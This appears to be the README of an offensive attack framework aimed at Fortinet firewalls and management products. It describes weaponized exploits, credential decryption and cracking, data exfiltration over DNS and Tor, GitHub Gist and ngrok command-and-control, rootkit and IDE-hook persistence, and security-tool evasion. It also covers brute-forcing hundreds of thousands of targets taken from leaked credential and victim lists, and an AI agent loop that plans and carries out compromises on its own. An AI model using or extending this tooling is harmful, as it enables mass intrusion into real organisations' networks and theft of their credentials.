<div align="center">
  <img src="assets/fortinet_hunter_banner.png" alt="Fortinet Hunter 2026" width="800"/>

  <h1>🗿 Fortinet Hunter 2026 v6.0 🗿</h1>

  <p><strong>Your personal, friendly, sentient Fortinet attack tool</strong><br>
  One step closer to Skynet.</p>


# 🔒 FORTINET HUNTER — 2026 EDITION

**State-of-the-Art FortiOS Attack Surface Mapper**

Author: **YogSotho**

Team: **BrokenSec**

Version: **2026**

---

## 📖 Overview

Fortinet Hunter is an offensive security research tool for Fortinet appliances.
It combines  fingerprinting, **27 CVE  version  and  active-probe  detection**,
**multiple protocol fuzzing strategies**,  advanced **post-exploitation** (firmware
extraction, persistence, FortiCrack credential decryption), and optional ML/AI
enhancements into a single async pipeline.

**Current state:** the  version-based CVE detection path is functional for
laboratory assessment of FortiOS 8.0.0 targets.  Active probes, fuzzing, and
ML modules require per-target tuning and controlled conditions.  All persistence
mechanisms must be validated in a lab before operational use.

### Supported Products

- FortiOS (7.0.x, 7.2.x, 7.4.x, 7.6.x, 7.8.x, 8.0.x)
- FortiManager (7.0.x – 8.0.x)
- FortiAnalyzer (7.0.x – 8.0.x)
- FortiSandbox (4.4.x – 5.0.x)

### Attack Surface Coverage

The following attack surfaces are covered by the tool:

| Attack Surface | Details |
|----------------|---------|
| SSL VPN | `/remote/`, `/sslvpn_login` |
| WebSocket | `/ws/`, `/ws/admin/`, `/ws/events` |
| SAML | `/remote/saml/`, `/remote/saml/login` |
| REST API | v2, v3 |
| FGFM Protocol | TCP 541 |
| SSH | Port 22 |
| HTTPS | ALPN fuzzing |
| SNMP | Port 161 |

---

## 📊 Key Numbers

The following metrics summarize the tool's capabilities:

| Category | Count |
|----------|-------|
| CVEs Detected | 31 (2018–2026) |
| Detector Modules | 10+ active probes |
| Post-Exploitation Modules | 10 (incl. 14 persistence mechs) |
| OSINT Platforms | 3 (Shodan, Censys, FOFA) |
| ML/AI Models | 4 (EPSS, Anomaly, Payload, Classify) |
| Shodan Dorks (bundled) | **2 879** |
| GitHub Secret Dorks (bundled) | **1 495** |
| Device Signatures (bundled) | **508** |
| Secrets Regex Patterns | **80+** |
| Proxy Schemes | HTTP, HTTPS, SOCKS5 |
| Test Suite | **828 passed + 32 subtests** |
| Version-Check Path | Functional for lab FortiOS 8.0.0 |

---

## 🔥 P3 Evolution (2026.08) — Multi-Product Offensive Framework

Phase 3 (P3-1 → P3-13) converted the v5.4 base into a unified
multi-product offensive framework (canonical ``fortinet_hunter`` package,
legacy ``fortigate_hunter`` shim):

| Layer | Deliverable | Where |
|-------|-------------|-------|
| Core | Plugin registry, typed Loot/SessionState, 49-CVE DB, target model | ``core/`` |
| Detectors | 23 detector plugins (10 new operator-prioritized CVEs) | ``detectors/`` |
| Exploits | 11 weaponized exploit plugins (all dry-run safe, lab-gated) | ``exploits/`` |
| Exfil | AES-256-GCM vault, DNS-TXT transport, FortiOS config decrypt, host harvest, AWS Secrets, CollectJuices | ``exfil/`` |
| Chains | 8 composed attack chains (exploit→exfil→persist→lateral) | ``chains/`` |
| Lateral | NTLM/PtH, AD spray, Azure SSO spray (RedSiege WS-Trust), OAuth/OCI/SMTP pivot, subdomain enum | ``lateral/`` |
| C2 | Tor SOCKS5 + DoH beacons, tasking, Ethereum-contract C2 lure (Shai) | ``c2/`` |
| Evasion | Proxy pool (P2C + sticky + health), EvasionProfile (AMSI/ETW patch, PPID spoof, timestomp) | ``core/proxy_pool.py``, ``ops/`` |
| Recon | SQLi scanner, SMTP hunter, IronVeil delivery, AD takeover, cert hunter (serial→maintainer cred), JS deobfuscator | ``recon/`` |
| Persist | Mechanisms #15 (GitHub token monitor) + #16 (IDE hooks) | ``persist/`` |
| Crypto | FortiOS rootfs ChaCha20 (RFC-verified core), getrootfskey seed recovery, FortilogDecoder (0xECCF/0xECDE/0xAA01) | ``post_exploit/`` |
| Companion | ``shodan-fortinet-hunter/`` — 12-family passive→verified discovery (Shodan/Censys/FOFA) | ``shodan-fortinet-hunter/`` |
| Tests | 420+ tests, mock-server library, CLI smoke, GitHub Actions CI | ``tests/``, ``.github/workflows/ci.yml`` |

**P4 (Phase Resources) extensions:** +3 CVE kits (70465/54121/56399) · cloud-native lateral
(k8s/etcd/kubelet/Ray/Docker/IMDS) · weaponization backports (ROP/FortiJump certs/EMS
cert-forgery/SAML) · evasion depth (BYOVD kernel, proc-inject, AI-gate) · JWT attack
engine + cert-hunter multi-source · bore C2 third transport + masquerade persistence #17 ·
FortiOS bash→Python backports · recon-data sync + methodology consolidation + 8
supply-chain rules · IoT-botnet beacon robustness (``c2/beacon_robustness.py``,
``docs/references/iot-botnet-patterns.md``).

**ML-* (state-of-the-art ML):** real trainable models, pure-Python (stdlib-only, sklearn
optional): ``ml/models.py`` (LogisticRegressionSGD with LogLoss+L2+early-stop,
AdaBoost decision-stump ensemble, FeatureExtractor) · ``ml/cve_risk.py`` EPSS-inspired
CVE exploitation-risk model trained on the 52-entry DB (``score --ml``) ·
``ml/anomaly.py`` z-score scan-anomaly baseline · ``ml/payload_classifier.py``
char-ngram payload classifier.  Legacy heuristic ML (EPSS/anomaly/generator/classifier)
stays aliased under ``fortinet_hunter.ml.*``.

**P5-1 (Agentic AI Orchestrator):** the closed agent loop — plan → execute →
critique → re-plan — drives the whole framework toward a goal
(``agent/`` package): ``planner.py`` (RulePlanner deterministic goal decomposition
over the ML-risk-ranked exploit registry + chain factory; LLMPlanner pluggable
protocol) · ``executor.py`` (registry dispatch for exploit/exfil/lateral/recon/chain,
dry-run safe) · ``critic.py`` (continue/escalate/pivot/abort verdicts + ML
scan-anomaly boost) · ``orchestrator.py`` (the loop, registered as ``agent_orchestrator``
plugin, pivot-exclusion re-planning, budget enforcement).  CLI:
``python3 -m fortinet_hunter agent <target> --goal exfil --dry-run --budget 8``.

**P5-2 (Dead-Drop C2):** two new C2 channels — ``c2/gist_channel.py`` (GitHub
Gist dead-drop resolver + beacon + operator: T1102.001 pattern, AES-GCM frames
base64-armored for gist text, injected HTTP = lab-gated) and ``c2/ngrok_channel.py``
(tunnel beacon + loopback relay: ``tcp://``/``https://`` endpoint parsing,
redirector-free public-tunnel pattern).  Both wired into the exfil transport
chain (``_GistTransport``/``_NgrokTransport``) so fallback degrades
Tor → DoH → bore → gist → ngrok.  Reference: ``docs/references/dead-drop-c2.md``.

**P5-3 (EPSS V5 feature expansion):** ``ml/risk_signals.py`` adds four
EPSS-V5-style signal sources over the 52-entry DB — CISA KEV membership
(``KEVSource``, from DB markers or injected set), public exploit-code presence
(``ExploitCodeSource``, from PoC flag or GitHub-scanner set), dark-web mention
counts (``DarkWebSource``, live collector wired in P5-5), and chain
reachability (``ChainReachability`` — is the CVE's exploit wired into a
framework chain).  ``CVERiskModel`` now trains with the 4-feature signal
vector (35 total), ``rank()`` attaches EPSS-style percentiles, and
``calibrate()`` reports a binned reliability curve.  CLI ``score --ml`` shows
PCT column.  All sources dry-run safe (offline defaults).

**P5-4 (Attack-Path Graph):** BlueHound/PivotMap-style planning over the
framework's own registry — ``core/attack_graph.py`` builds a directed
capability graph (nodes = target/shell/config/creds/loot/implant; edges =
plugin modules with pre/postconditions from the CVE DB + registry),
``GraphPlanner`` runs weighted BFS (preauth edges cheaper) to the cheapest
path to a goal, and the agent layer gained ``GraphPlanner``
(``--planner graph``) mapping graph edges to executable steps.  CLI:
``python3 -m fortinet_hunter path <target> --goal exfil --dry-run``.
Registered ``attack_graph`` (kind ``core``).

**P5-5 (Dark-Web Monitoring):** ``recon/darkweb_monitor.py`` monitors
underground sources for a target domain — RansomLook victim API (threat
findings + group attribution), Ahmia onion index (token-aware query
pattern), Tor Threat-Intel API (credential/config findings) — all
HTTP-injected (lab-gated live), normalized to ``DarkFinding`` → typed Loot.
``cve_mentions()`` / ``to_ml_source()`` bridge findings into the P5-3
``DarkWebSource`` so the EPSS-style risk model consumes real underground
chatter.  CLI: ``python3 -m fortinet_hunter darkweb <domain> --dry-run``
(offline parser validation).

**P5-6 (Exploit-Success Model):** ``ml/exploit_success.py`` predicts
P(success | exploit, target-context) — the Expected-Exploitability /
ExploitOracle lineage over the framework's own registry.
``ExploitOutcome`` records dry-run/lab runs (the agent executor's
feedback currency); training uses recorded outcomes as labels when
present, else the leakage-safe ``active_exploitation`` proxy; generic
exploits carry a negative bias.  ``predict()``/``rank()`` order the
exploit list the P5-1/P5-4 planners consume.  CLI:
``python3 -m fortinet_hunter score --success``.

**P5-7 (Enhanced Reporting):** ``reporting/enhanced.py`` upgrades the
static report with the P5-4 capability-graph visualization, P5-3 ML risk
heatmap (EPSS percentiles), P5-6 exploit-success table, and a loot
timeline — plus an optional LLM executive summary (``LLMSummaryAdapter``
protocol; default deterministic ``RuleBasedSummarizer``, offline).
CLI: ``python3 -m fortinet_hunter report <json> --enhanced [--llm-summary path.to.Adapter]``
(HTML or JSON payloads, dashboard-consumable).

**P5-8 (Packaging & Distribution):** finalized distribution tooling —
``tools/gen_inventory.py`` (CycloneDX-inspired SBOM: file manifest with
SHA-256 hashes, dependency parse from setup.py, plugin/CVE counts from the
live registry, Markdown render) · ``tools/build_zip.py`` now embeds
``INVENTORY.json`` into the artifact (``--no-sbom`` to skip) · setup.py
extras gained ``llm`` (openai) + ``shodan`` (shodan/censys) · CI gained a
``package`` job that builds + verifies + uploads the distribution
artifact (P5-8).  Live artifact: 58 CVEs, 97 plugins
across 11 kinds (32 detectors, 19 exploits, 10 recon incl. megalodon).

**P5-9 (Test Hardening):** ``tests/test_property_fuzz.py`` — pure-stdlib
property-based fuzzing (no hypothesis dependency; seeded deterministic
corpus): chacha20 stream roundtrip, C2 AES-GCM frame roundtrip + tamper +
wrong-key rejection, gist armor, JWT base64url, keyed-XOR inverse, loot
dedup, feature-extractor invariants, graph-planner determinism, payload
classifier stability.  ``tools/coverage_gate.py`` — stdlib ``sys.settrace``
coverage gate (coverage.py lineage, no pytest-cov): aggregate ≥30% +
P5-core per-module ≥50% (agent/ml/graph/darkweb/c2/enhanced).  Wired into
CI (``Coverage gate (P5-9)`` step) + ``tools/run_ci.sh``.  Live: aggregate
31.7%, all 15 P5-core modules pass (risk_signals 89%, attack_graph 86.8%).

**TEST-1 (live emulation):** booted FortiGate 7.6.7 KVM under QEMU and fired
the framework at it — full compromise (console + SSH) and exfiltration
(26 typed hash Loot from the live config, vault-sealed).  Fixed 3 real
bugs found by live use: `scan` `web_dashboard` attr crash, `exploit` CLI
missing HTTP session (live exploitation was impossible), SSL-VPN
fingerprint missing the modern Angular portal (`ssl_vpn_enabled: False`
on a portal-bearing 7.6.7).  Report: ``tmp/TEST1-DELIVERY-REPORT.md``.

**P6-1 (August 2026 CVE wave):** deep research (web + Tor/Ahmia) found the
current actively-exploited FortiOS wave missing from the DB — added six
CVEs (+6 → **58 total**): **CVE-2026-39801** (sslvpnd heap OOB write via
doubly percent-encoded URLs, CVSS 9.8, CISA KEV, pre-auth RCE actively
exploited by APTs — behavioral probe detector + dry-run-safe exploit
`cve_2026_39801_exp`), **CVE-2026-71407** (WAD stack buffer overflow,
explicit-proxy Kerberos+SOCKS prerequisite), **CVE-2026-23573** (Agentless
SSL-VPN reflected XSS), **CVE-2026-59839** (CLI path traversal — arbitrary
write/delete), **CVE-2025-43892** (authd/wad buffer overread memory leak),
**CVE-2026-71408** (UI DoS resource exhaustion).  All six detectors
version-gated with behavioral probe fallback for 39801; verified CLEAN
against the live 7.6.7 TEST-1 box (patched negative control).  Report:
``tmp/P61-DELIVERY-REPORT.md``.

**P6-2 (FortiBleed-style passive auth sniffer):** mirrors the
FortigateSniffer TTP from the FortiBleed campaign (Feb–Jun 2026 —
430,000+ FortiGates, 110M credentials, 659 pipelines in 15 days, Russian
IAB, Lynx/INC-linked).  `ops/passive_auth_sniffer.py` abuses FortiOS's
built-in ``diagnose sniffer packet`` — a legitimate diagnostic command —
to passively capture authentication traffic across the campaign's
24-protocol surface: cleartext extraction (HTTP Basic, FTP, POP3, IMAP,
SMTP AUTH LOGIN, LDAP bind, RADIUS PAP, PostgreSQL, SNMP, Telnet, MSSQL)
plus hashed capture for offline cracking (NTLMv2 → hashcat 5600, Kerberos
AS-REP → 18200, VNC challenge).  Port-context parsing prevents
cross-protocol bleed; typed Loot per credential class
(`fortibleed:sniffer:<proto>`); dry-run validates parsers on synthetic
captures (zero network); live drives a ``FortiOSCLI`` (env-configured).
CLI: ``sniff run|command|parse`` (``--dry-run``, ``--interface``,
``--count``, ``--filter``).  Registered as ``ops_passive_auth_sniffer``
(kind evasion).  Report: ``tmp/P62-DELIVERY-REPORT.md``.

**EXTRA-1 (FortiBleed panel source study — enhancements):** the operator
found the FortiBleed operator-panel source (`resources/Fortigate-Sniffer/`
— the research replica with server.py, sniftran, mock_forti).  Studied it
carefully and ported its proven techniques into the framework:

* **pcapng binary capture support** — `passive_auth_sniffer` gained
  `parse_pcapng_packets` (dependency-free pcapng parser: SHB/EPB/SPB/PB,
  byte-order aware), `pkt_net` (Ethernet/IPv4/TCP header parse for
  src/dst/sport/dport enrichment), and `harvest_payload` (HTTP Basic,
  FTP, SMTP AUTH LOGIN+PLAIN, HTTP POST form creds, NTLMSSP types 1/2/3,
  LDAP BER simple-bind) — the sniffer now works on both `diagnose
  sniffer` text captures and converted .pcapng files (sniftran-compatible).
* **Plaintext SH2/AK1/PBKDF2 hash extraction** — `fortios_config` gained
  `parse_hash_fields` (the panel's `set password SH2 ...` → hashcat
  pipeline): extracts plaintext admin hashes with hashcat mode meta
  (26300/7000/22600) as typed `hash` loot, wired into the exfiltrator's
  `run()` — feeds the P6-3 cracker directly.

Report: `tmp/EXTRA1-DELIVERY-REPORT.md`.

**EXTRA-2 (FortiBleed full package — corpus ingestion):** the operator
found the complete FortiBleed target package (`resources/Fortibleed/` —
`fortinet_panels.txt` 265K + `fortinet_vpn.txt` 565K).  Added
`recon/fortibleed.py` — **FortiBleedCorpus**: load + dedup + classify the
830K-entry corpus (surface = panel / vpn / both by file membership +
port heuristics: admin panels favour 443/8443, SSL-VPN portals favour
10443/4443/4433), emit typed `target` Loot, and a **checkpointed target
queue** (panel-style brute checkpoint/resume: bounded batches,
`fortibleed_checkpoint.json`, resume from last batch).  Registered as
`fortibleed_corpus` (kind recon).  CLI: ``fortibleed stats|list|process|
checkpoint`` (``--surface``, ``--limit``, ``--batch-size``,
``--max-batches``, ``--checkpoint-dir``, ``--dry-run``).  Live: 588,958
deduped targets (23,826 panel / 381,698 vpn / 183,434 both).  Report:
`tmp/EXTRA2-DELIVERY-REPORT.md`.

**EXTRA-3 (generic .txt brute-force CLI — Belsen-ready):** the operator
found the full Belsen leak (`resources/Belsen-leak/` — 15,474
`config.conf` + `vpn-passwords.txt` with 158K user:pass lines, 6.5 GB).
Per operator direction, the dedicated ``fortibleed`` CLI was **replaced**
by a generic ``brute`` command: ``brute <target> --creds user:pass.txt
[--targets host:port.txt] [--spray] [--threads] [--dry-run] ...`` — any
.txt credential file + any .txt target file work (Belsen
vpn-passwords.txt header lines auto-skipped, Belsen ``host_port``
device-dir naming auto-normalised to ``host:port``).  The
`fortibleed` corpus module stays as a library (`FortiBleedCorpus` for
programmatic checkpointed queueing).  Backed by the legacy `CredTester`
engine (lockout-aware, spray-mode, proxy-aware).  Report:
`tmp/EXTRA3-DELIVERY-REPORT.md`.

**MEGALADON (CI/CD supply-chain worm — private source):** the operator
provided the decoded MEGALODON payload (`resources/megaladon.txt`) — the
TeamPCP campaign (2026-05-18: 5,718 commits / 5,561 repos / 6 hours) that
injected GitHub Actions workflows (SysDiag mass + Optimize-Build dormant
variants) with a base64-piped bash payload exfiltrating CI secrets, cloud
credentials, SSH keys, OIDC tokens to C2 `216.126.225.129:8443`.

* `recon/megalodon.py` — static IOC detection: workflow-name
  fingerprints (SysDiag/Optimize-Build), `base64 -d | bash` payload
  staging, `id-token: write` + `actions: read` permissions,
  `pull_request_target` / dormant `workflow_dispatch`, forged CI author
  names (build-bot/auto-ci/ci-bot/pipeline-bot), the seven campaign
  commit messages, C2 markers, IMDS/OIDC/env-dump harvesting in decoded
  payloads.  Weighted scoring → CLEAN/SUSPICIOUS/LIKELY/MATCH verdicts.
  Registered `megalodon_detector` (kind recon); CLI `megalodon
  <workflow|payload|b64blob> [--author] [--message] [--decode]`.
* `secrets_scanner` +10 MEGALODON secret patterns (Sendinblue xkeysib,
  Bitbucket ATBB/ATATT/ATCTT, Heroku HRKU, Dropbox dp., Buildkite bkua,
  Pulumi pul-, Postman PMAK, Azure SAS sig, ENV KEY=VAL).
* `gen_inventory` excludes bulk corpora (Belsen-leak, Fortibleed, panel
  venv) from the SBOM manifest.

Verified: real payload → **MEGALODON MATCH (12)**, Optimize-Build
workflow + forged commit → **MATCH (13)**, clean workflow → CLEAN.
Report: `tmp/MEGALADON-DELIVERY-REPORT.md`.

**P6-3 (FortiOS SH2/AK1 hash cracker — exfil loop closed):** the
`fortios_config` exfiltrator recovered admin hashes but nothing cracked
them.  `ops/crack.py` closes the loop:

* :func:`sh2_verify` — pure-Python SH2 verifier (hashcat mode 26300
  compatible): ``SH2 = "SH2" + base64(salt[12] | SHA256(salt | password |
  FORTINET_MAGIC))`` with the 24-byte Fortinet constant
  ``a388ba2e...5b70``.  Verified against hashcat's own module self-test
  vector and real olly-ru recovered configs.
* AK1 (SHA1, mode 7000) support via the same salt/magic layout.
* `FortiOSCracker` — ``hashcat`` mode (temp hash file → ``hashcat -m
  26300/7000`` → potfile parse) or pure-Python ``python`` mode (wordlist
  sweep + bounded brute force, zero deps).
* Input: raw hash string, file, or **loot JSON** from the exfil pipeline
  (`extract_sh2_from_loot`); output: typed `credential` loot
  (`crack:<source>`, username:plaintext, method meta).
* CLI: ``crack <hash|file|json> [--mode hashcat|python]
  [--wordlist] [--hashcat-bin] [--dry-run]``.

Report: ``tmp/P63-DELIVERY-REPORT.md``.

**TEST-1 Fix A (per-device PDE key exfil):** `fortios_config` now
supports the modern FortiOS 7.x `private-data-encryption` scheme (AES-128-
CBC, IV = `blob[0:4]` + 12 zero bytes, ciphertext = `blob[4:]`, 16-byte
per-device key) in addition to the legacy static-key scheme — key from
`FH_FORTIOS_PDE_KEY` env (32-hex / 24-b64 / raw 16), constructor arg, or
the `Mary had a littl` default; malformed keys fall back with a warning.
Loot carries a `recoverable` meta flag (`true` when plaintext recovered,
`false` for hash-only captures) so delivered loot is never mistaken for
usable when it isn't.

**TEST-1 Fix B (SSH private-key exfil):** `fortios_config` now harvests
embedded private keys from `config vpn certificate local` and `config
firewall ssh local-key` blocks — quoted PEM bodies extracted as typed
`ssh_key` / `certificate` Loot, with the protecting passphrase ENC blob
decrypted via the PDE key when available (`passphrase_recoverable` meta
flag otherwise).  `parse_private_keys()` + `PrivateKeyLoot`; wired into
the exfiltrator's `run()` (detail line reports private-key count).

**TEST-1 Fix E (FortiOS 7.4+ ENC key — SECRETS NOW DECRYPT):** the
FortiOS config-ENC scheme for 7.4+ (build 2731+) is now supported: blobs
carry the 8-byte trailer `Yf267vE@` and are AES-256-CBC under the
hardcoded key `91bc4d1e...c1db` (first published by n0p.me/fortitool,
2026-08-21 — never in public tooling before).  Layout: `[IV:4][ct:144]
[marker:8]`, fixed calloc buffer (NUL-split plaintext) for cert/PKI
fields; shorter PKCS#7 shape for admin/user passwords; legacy pre-7.4
blobs (no marker) still route to the `Mary had a littl` key.  Verified on
the live 7.6.7 box: **24/27 secrets recovered** — `guest`, the planted
`ExfilUser!Pass77`, `fortinet` (FortiAP mesh), `fortinet.mesh.root`
(WPA3 SAE), cert passphrases as 64-hex strings that **successfully
unlock the CA private key** (`RSAPrivateKey` loaded).  Admin password
blobs decrypt to SH2 64-hex hashes (hashcat 26300).

**TEST-1 Fix C (stateful exfil):** `BaseExfiltrator.__init__` now wraps
`run()` so produced loot auto-merges into `session.state.loot` via
`add_loot` (dedup-safe) — standalone exfil invocation is stateful out of
the box (previously callers had to merge `result.loot` manually; only the
chain stage did).  `chains/factory.py` ExfilStage merge switched to the
dedup-safe path so the double-merge is harmless.

CLI: ``python3 -m fortinet_hunter {scan,exploit,chain,agent,path,darkweb,list,score,report,dashboard,beacon,doh-server,evade,fuzz,persist,fgfm,osint,extract}`` (``score --success`` ranks exploits by P(success))

**PHASE-STUBS (stub replacement):** full framework audit for non-working
stubs/sample functions — every placeholder replaced with real weaponized
code (suite **828 passed + 32 subtests**):

* `firmware_extractor._establish_shell()` — was `pass`; now attempts live
  RCE exploits via the registry and builds a `WebShellShell` adapter so the
  whole firmware pipeline runs through a dropped implant.
* `_extract_via_scp()` — was `pass`; now real SFTP pull of critical files.
* `_extract_rootfs()` — was “note the location”; now full pure-Python cpio
  extraction (newc/odc/bin) with path-traversal rejection.
* `hardware_extractor` JTAG — `_detect_jtag_scan_chain()` (was `pass`)
  now runs openocd `scan_chain` against common adapters and parses TAPs;
  `_extract_jtag()` (was None) now dumps flash via openocd `dump_image`.
* `update_interceptor._setup_proxy()` — was fake config; now generates a
  real CA + leaf cert (cryptography) for TLS interception, persisted under
  `~/.fortinet-hunter/mitm/`.
* `persistence._generate_ssh_key()` — was a fake key with `...`; now real
  RSA-2048 OpenSSH key (optionally saved via `ssh_key_path`).
  `deploy_rootkit()` — was placeholder; now writes a real LKM rootkit
  source + Makefile and compiles on-target (Reptile-style custom launcher).
* LLM protocol stubs (`LLMPlanner`, `LLMAdapter`, `LLMSummaryAdapter`) —
  were `NotImplementedError`; now real OpenAI-compatible callers in
  `fortinet_hunter/llm_client.py` (goal decomposition, telemetry decision,
  executive summary) with safe local fallbacks when no API key is set.
* `ide_hooks.phone_home()` — was a log-only stub; now sends an encrypted
  AES-256-CBC beacon to the callback URL on IDE rehydration.

New regression suite: `tests/test_stub_replacement.py` (11 tests) + P5-7
LLM-summary test updated for the real adapter.
---

<div align="center">
  <img src="assets/profile.jpg" alt="Fortinet Hunter 2026" width="800"/>

## 🔍 Recon Modules

### Dork Scanner

Mass-discovery across Shodan, Censys, and FOFA using 2 879 bundled dorks.
Results are de-duplicated by `ip:port` and passed to the target scan pipeline.

```bash
# Shodan + all bundled dorks, through a proxy
fortigate-hunter --shodan-key KEY --use-dorks --dork-limit 200 \
    --proxy socks5://127.0.0.1:1080

# FOFA + dorks
fortigate-hunter --fofa-email EMAIL --fofa-key KEY --use-dorks --dork-limit 50
```

### GitHub Secret Scanner

Searches GitHub public repos for leaked API keys, tokens, and credentials
using 1 495 bundled code-search dorks. Requires a GitHub PAT with `public_repo`
scope. Rate-limited to 1 search/second to stay within GitHub's secondary limits.

```bash
fortigate-hunter --github-token ghp_xxx --github-org target-corp --dork-limit 30
```

### Device Signature Matcher

Matches HTTP response bodies against 508 device fingerprints (Dell, HP, Xerox,
Synology, Cisco, Polycom, and more). Returns device labels and known-default
credentials for each match.

```bash
fortigate-hunter -t https://192.168.1.1 --signature-scan
```

### Secrets Scanner (80+ patterns)

Applies compiled regex patterns to HTTP responses looking for leaked credentials.
Covers AWS, GCP, GitHub, Stripe, Shopify, Slack, JWT, SSH private keys, and more.

```bash
fortigate-hunter -t https://192.168.1.1 --scan-secrets
```

### Proxy Support (all modules)

All outbound connections (OSINT clients, recon modules, CVE probes, fuzzing) now
route through a single proxy chain configured with:

```bash
--proxy http://127.0.0.1:8080        # HTTP proxy (Burp, mitmproxy)
--proxy socks5://127.0.0.1:1080      # SOCKS5 (Tor, SSH tunnel)
--proxy-auth user:pass               # Proxy authentication
```

Environment variables `HTTP_PROXY`, `HTTPS_PROXY`, and `ALL_PROXY` are also
respected when `--proxy` is not supplied.

---

## 🚀 Features

### Fingerprinting

The fingerprinting engine extracts comprehensive information from target devices:

- HTTP header analysis (Server, version, build extraction)
- `/remote/info` endpoint parsing (portal name, version, build)
- Favicon hash matching (Shodan-compatible)
- SSL certificate analysis (CN and O fields)
- REST API v2/v3 endpoint probing
- WebSocket detection (`/ws`, `/ws/admin`, `/ws/events`)
- SAML metadata extraction with certificate inspection
- FortiCloud SSO detection
- Build-to-version mapping (50+ builds, 7.0 → 8.0.0)
- Serial number and hostname extraction

### CVE Detection (31 CVEs)

The detectors directory contains **10+ detector modules**, each targeting specific CVEs:

| Detector File | CVEs Covered | Description |
|---------------|--------------|-------------|
| `cve_2018_13379.py` | CVE-2018-13379 | Path Traversal in sslvpnd |
| `cve_2024_23113.py` | CVE-2024-23113 | FGFM Format String |
| `cve_2024_47574.py` | CVE-2024-47574 | FortiJump (Auth Bypass) |
| `cve_2024_47575.py` | CVE-2024-47575 | FGFM RCE |
| `cve_2025_59718.py` | CVE-2025-59718 | SAML Signature Bypass |
| `cve_2026_20024.py` | CVE-2026-20024 | SSL-VPN Auth Bypass (UNC5221) |
| `cve_2026_22153.py` | CVE-2026-22153 | LDAP Auth Bypass |
| `cve_2026_24858.py` | CVE-2026-24858 | FortiCloud SSO Bypass |
| `cve_2026_25815.py` | CVE-2026-25815 | Static Encryption Key |
| `cve_2026_59840.py` | CVE-2026-59840 | Buffer Overread |
| `cve_2026_25089.py` | CVE-2026-25089 | FortiSandbox RCE |
| `symlink_bypass.py` | CVE-2025-68686 | Symlink Persistence Bypass |
| `websocket_rce.py` | CVE-2025-0901 | WebSocket RCE (FortiOS 8.0) |

The complete CVE matrix is provided below.

### Fuzzing (40+ payload categories)

The fuzzing payload categories are listed in the Fuzzing Payload Categories section below.

### Protocol Fuzzing

The tool supports fuzzing of additional protocols beyond SSL VPN:

- **SSH** — Banner grabbing, version detection, overflow
- **HTTPS** — ALPN fuzzing (CVE-2026-0012)
- **SNMP** — Community string brute force

### FGFM Protocol Probing

The FGFM prober performs the following actions:

- Discovery request
- Registration (v7 and v8)
- Format string (CVE-2024-23113)
- Unauthenticated command (CVE-2024-47575)
- Heap overflow (CVE-2026-0221, CVE-2026-25092)

### Post-Exploitation (10 modules)

The post-exploitation modules are listed in the Post-Exploitation Modules section below.

### Persistence Mechanisms (14)

The persistence mechanisms are listed in the Persistence Mechanisms section below.

### ML/AI Enhancements

The ML/AI enhancements are listed in the ML/AI Enhancements section below.

### Threat Intelligence

The threat intelligence module integrates the following sources:

- CISA KEV catalog (auto-fetch)
- Fortinet PSIRT RSS feed
- GitHub PoC tracking
- EPSS scoring
- Priority scoring

### Reporting

The reporting engine outputs data in the following formats:

- **JSON** — Full structured data
- **HTML** — Visual, color-coded
- **Console** — Color-coded

### OSINT Integration

The OSINT module searches the following platforms:

- **Shodan** — 7 pre-built queries, async
- **Censys** — Full async client
- **FOFA** — Full async client

### Web Dashboard

The BrokenSec-branded web dashboard provides:

- Real-time scan controls
- Live progress tracking
- Statistics display (CVEs, anomalies, FGFM, persistence, duration)
- Graphical result rendering
- BrokenSec dark theme with glitch effects
- "DATA CORRUPT" branding
- ML/AI status display
- OSINT result display
- Persistence deployment controls

The dashboard exposes the following REST API endpoints:

| Endpoint | Description |
|----------|-------------|
| `/` | Dashboard UI |
| `/api/status` | Scan status (scanning, progress, results_ready, ml_available) |
| `/api/results` | Full scan results (JSON) |
| `/api/scan` | Start new scan (POST with `{"target": "url"}`) |
| `/api/ml-status` | ML/AI model status |
| `/api/shutdown` | Shutdown dashboard |

### Shell Integration

The shell module provides:

- SSH with PTY (paramiko)
- Command execution with proper error handling
- File transfer (SCP/SFTP)
- Interactive session support
- Session persistence and reconnection

### Hardware Extraction

The hardware extraction module supports:

- UART serial detection and connection
- Baud rate scanning
- Boot console capture
- JTAG scan chain detection
- Flash memory dumping via JTAG
- OpenOCD integration

### Parallel Scanning

The parallel scanning engine provides:

- 10–20× speedup for large networks
- Semaphore-controlled concurrency
- Task distribution

---

## 🛡️ CVE Detection Matrix (28+ CVEs)

The following table lists all detected CVEs with their severity, detection method, and exploitation status:

| CVE ID | Product | Severity | Method | Exploitation |
|--------|---------|----------|--------|--------------|
| CVE-2024-21762 | FortiOS | CRITICAL | `version_check` | - |
| CVE-2024-23113 | FortiOS | CRITICAL | `fgfm_probe` | - |
| CVE-2024-47574 | FortiManager | CRITICAL | `fgfm_auth` | - |
| CVE-2024-47575 | FortiManager | CRITICAL | `fgfm_cmd` | - |
| CVE-2024-55591 | FortiOS | CRITICAL | `version_check` | - |
| CVE-2023-27997 | FortiOS | CRITICAL | `version_check` | - |
| CVE-2022-42475 | FortiOS | CRITICAL | `version_check` | - |
| CVE-2018-13379 | FortiOS | CRITICAL | `path_traversal` | - |
| CVE-2020-12812 | FortiOS | HIGH | `version_check` | - |
| CVE-2026-20024 | FortiOS | CRITICAL | `ssl_vpn_probe` | 🔴 ACTIVE |
| CVE-2026-24858 | All | CRITICAL | `sso_probe` | 🔴 ACTIVE |
| CVE-2026-59840 | FortiOS | CRITICAL | `overread` | 🔴 ACTIVE |
| CVE-2025-59718 | FortiOS | CRITICAL | `saml_bypass` | 🔴 ACTIVE (PoC) |
| CVE-2026-22153 | FortiOS | CRITICAL | `ldap_probe` | ⚠️ PoC |
| CVE-2026-25815 | FortiOS | HIGH | `config_check` | 🔴 ACTIVE |
| CVE-2025-0901 | FortiOS 8.0 | CRITICAL | `ws_probe` | ⚠️ PoC |
| CVE-2025-1123 | FortiOS | HIGH | `saml_metadata` | - |
| CVE-2026-0012 | FortiOS | HIGH | `version_check` | - |
| CVE-2026-0147 | FortiManager | CRITICAL | `api_probe` | - |
| CVE-2026-0221 | FortiManager | CRITICAL | `fgfm_probe` | - |
| CVE-2026-0333 | FortiOS 8.0 | HIGH | `ws_probe` | - |
| CVE-2026-0444 | FortiOS | HIGH | `saml_metadata` | - |
| CVE-2026-0555 | FortiOS 8.0 | MEDIUM | `path_traversal` | - |
| CVE-2025-68686 | FortiOS | HIGH | `symlink_probe` | 🔴 ACTIVE |
| CVE-2026-22828 | FortiManager | CRITICAL | `fgfm_probe` | ⚠️ PoC |
